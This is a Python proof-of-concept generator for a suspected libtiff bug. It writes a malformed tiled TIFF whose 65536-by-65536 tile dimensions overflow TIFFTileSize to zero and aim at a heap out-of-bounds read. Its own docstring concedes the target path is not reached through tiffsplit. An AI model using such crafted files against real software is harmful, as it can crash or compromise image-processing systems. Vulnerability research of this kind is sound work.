#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  gtTileContig heap OOB read via TIFFTileSize overflow and malloc(0)

Constructs a tiled TIFF with TileWidth=65536 and TileLength=65536.
TileWidth * TileLength * SamplesPerPixel * BytesPerSample
  = 65536 * 65536 * 1 * 1 = 2^32 => 32-bit overflow => 0.
So TIFFTileSize() returns 0, and _TIFFmalloc(0) returns non-NULL,
bypassing the buf==NULL check.

NOTE: tiffsplit itself uses cpTiles() -> TIFFReadRawTile(), NOT TIFFRGBAImageGet().
This PoC file is constructed to satisfy the described conditions; see
vuln_001_notes.md for why the target code path cannot be triggered via tiffsplit.
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")

def u16(v): return struct.pack('<H', v)
def u32(v): return struct.pack('<I', v)

def ifd_entry_short(tag, value):
    """12-byte IFD entry for SHORT (type=3), count=1."""
    return struct.pack('<HHII', tag, 3, 1, value & 0xFFFF)

def ifd_entry_long(tag, value):
    """12-byte IFD entry for LONG (type=4), count=1, value stored inline."""
    return struct.pack('<HHII', tag, 4, 1, value & 0xFFFFFFFF)

# -----------------------------------------------------------------------
# Image parameters
# -----------------------------------------------------------------------
IMAGE_WIDTH   = 256
IMAGE_LENGTH  = 256
TILE_WIDTH    = 65536   # causes 32-bit overflow in TIFFTileSize
TILE_LENGTH   = 65536
BPS           = 8
SPP           = 1

# Number of tiles that cover the image:
#   ceil(256 / 65536) x ceil(256 / 65536) = 1 x 1 = 1 tile
N_TILES = 1

# Actual on-disk tile data: just IMAGE_WIDTH * IMAGE_LENGTH bytes of zeros.
# A compliant TIFF reader will only read IMAGE_WIDTH columns per row for
# IMAGE_LENGTH rows, so 256*256 = 65536 bytes is sufficient.
TILE_DATA_SIZE = IMAGE_WIDTH * IMAGE_LENGTH  # 65536 bytes
tile_data = bytes(TILE_DATA_SIZE)

# -----------------------------------------------------------------------
# Layout
# -----------------------------------------------------------------------
# Offset 0   : TIFF header       (8 bytes)
# Offset 8   : IFD               (2 + 11*12 + 4 = 138 bytes)
# Offset 146 : tile data         (65536 bytes)
HEADER_SIZE = 8
N_TAGS = 11
IFD_SIZE = 2 + N_TAGS * 12 + 4
IFD_OFFSET = HEADER_SIZE
TILE_DATA_OFFSET = IFD_OFFSET + IFD_SIZE  # 8 + 138 = 146

# -----------------------------------------------------------------------
# Build IFD (tags must be in ascending numeric order)
# -----------------------------------------------------------------------
entries = b""
entries += ifd_entry_long (256, IMAGE_WIDTH)    # ImageWidth
entries += ifd_entry_long (257, IMAGE_LENGTH)   # ImageLength
entries += ifd_entry_short(258, BPS)            # BitsPerSample
entries += ifd_entry_short(259, 1)              # Compression = NONE
entries += ifd_entry_short(262, 1)              # PhotometricInterp = BlackIsZero
entries += ifd_entry_short(277, SPP)            # SamplesPerPixel
entries += ifd_entry_short(284, 1)              # PlanarConfig = CONTIG
entries += ifd_entry_long (322, TILE_WIDTH)     # TileWidth  = 65536
entries += ifd_entry_long (323, TILE_LENGTH)    # TileLength = 65536
# TileOffsets (tag 324): 1 tile, value fits inline as LONG
entries += ifd_entry_long (324, TILE_DATA_OFFSET)
# TileByteCounts (tag 325): 1 tile, actual bytes on disk
entries += ifd_entry_long (325, TILE_DATA_SIZE)

assert len(entries) == N_TAGS * 12

ifd = u16(N_TAGS) + entries + u32(0)  # 0 = no next IFD

# -----------------------------------------------------------------------
# Assemble file
# -----------------------------------------------------------------------
header = b'II' + u16(42) + u32(IFD_OFFSET)

tiff_bytes = header + ifd + tile_data

assert len(header) == HEADER_SIZE
assert len(ifd)    == IFD_SIZE
assert TILE_DATA_OFFSET == HEADER_SIZE + IFD_SIZE

with open(OUTPUT, 'wb') as f:
    f.write(tiff_bytes)

print(f"[+] Written {len(tiff_bytes)} bytes to {OUTPUT}")
print(f"    TileWidth={TILE_WIDTH}, TileLength={TILE_LENGTH}")
print(f"    TileWidth*TileLength = {TILE_WIDTH*TILE_LENGTH} "
      f"(0x{TILE_WIDTH*TILE_LENGTH:016X}, 32-bit = {(TILE_WIDTH*TILE_LENGTH) & 0xFFFFFFFF})")
print(f"    => TIFFTileSize() will return 0 (32-bit overflow)")
print(f"    => _TIFFmalloc(0) returns non-NULL on Linux")
